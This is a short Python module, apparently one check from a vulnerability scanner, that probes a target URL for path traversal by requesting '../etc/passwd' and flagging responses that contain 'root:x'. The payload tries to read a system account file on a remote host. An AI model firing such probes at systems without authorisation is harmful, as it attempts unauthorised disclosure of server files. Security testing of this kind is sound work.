import requests
import time

def run(target, timeout=15, dangerous=False):
    results = []
    headers = {
        "User-Agent": "RedMind-AI-VAPT/1.0",
        "Accept": "*/*"
    }


    try:
        r = requests.get(target + "?file=../etc/passwd", headers=headers, timeout=timeout)
        if "root:x" in r.text:
            results.append({
                "issue": "Path Traversal",
                "confidence": "HIGH"
            })
    except Exception:
        pass


    return {
        "check_id": "RM-CHK-082",
        "severity": "CRITICAL",
        "target": target,
        "dangerous": dangerous,
        "findings": results,
        "summary": {
            "tested_requests": len(results),
            "positive_hits": len(results)
        }
    }
